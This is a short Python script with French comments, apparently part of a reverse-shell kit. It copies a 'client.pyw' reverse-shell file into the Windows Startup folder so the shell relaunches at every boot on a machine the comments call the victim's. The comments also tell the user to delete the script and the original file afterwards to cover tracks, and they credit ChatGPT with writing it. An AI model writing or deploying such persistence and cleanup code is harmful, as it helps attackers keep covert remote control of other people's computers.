# Programme réalisé par : ChatGPT, merci encore frro

# Permet de cloner le fichier client.pyw dans le startup de Windows pour lancer le reverse shell a chaque lancement de l'ordinateur
# Utilisation: python startup.pyw [Chemin d'acces du fichier client.pyw], Exemple: C:\Users\Victime\Documents\client.pyw

# Pensez a supprimer le fichier 'startup.pyw' sur le pc de la victime avec la commande 'del startup.pyw'

# Une fois que le pc a été lancé n'oubliez pas de supprimer votre ancien fichier client.pyw, la ou il a été éxécuté une premiere fois

import os
import shutil
import sys

def main():
    if len(sys.argv) < 2:
        print("Utilisation : python main.py [Chemin d'accès]")
        sys.exit(1)

    source_file = sys.argv[1]
    if not os.path.exists(source_file):
        print(f"Le fichier '{source_file}' n'existe pas.")
        sys.exit(1)

    appdata_path = os.environ.get('APPDATA')
    startup_path = appdata_path + '\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'
    destination_file_name = os.path.basename(source_file)
    destination_file = os.path.join(startup_path, destination_file_name)

    shutil.copy(source_file, destination_file)
    print(f"Le fichier '{source_file}' a été copié dans '{destination_file}'.")

if __name__ == "__main__":
    main()
